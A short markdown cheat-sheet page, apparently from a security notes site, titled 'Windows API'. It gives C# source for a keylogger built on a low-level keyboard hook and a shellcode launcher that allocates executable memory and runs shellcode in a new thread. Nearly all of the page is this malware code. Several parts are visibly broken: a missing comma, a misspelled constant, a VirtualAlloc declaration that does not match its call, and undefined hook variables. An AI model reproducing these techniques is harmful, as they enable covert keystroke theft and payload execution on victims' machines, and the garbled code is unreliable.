---
title: Windows API
desc: 
tags: [API, Keylogger, Shellcode, Windows, Win32]
alts: []
render_with_liquid: false
---

## Online Tools

- **[MalAPI](https://malapi.io/){:target="_blank"}{:rel="noopener"}**

<br />

## Keylogger

```c#
class Keylogger
{
	[DllImport("user32.dll" CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreaded);
	[DllImport("user32.dll", CharSet = CharSet.auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);
	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);
	private static int WHKEYBOARDLL = 13;
	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetCurrentProcess();
	
	public static void Main()
	{
		_hookID = SetHook(_proc);
		Application.Run();
		UnhookWindowsHookEx(_hookID);
		Application.Exit();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using (Process curProcess = Process.GetCurrentProcess())
		{
			return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
		}
		
	}
}
```

<br />

## Shellcode Launcher

```c#
class ShellcodeLauncher
{
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 flAllocationType, UInt32 flProtect);
	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

}
```

```c#
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXEUCTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```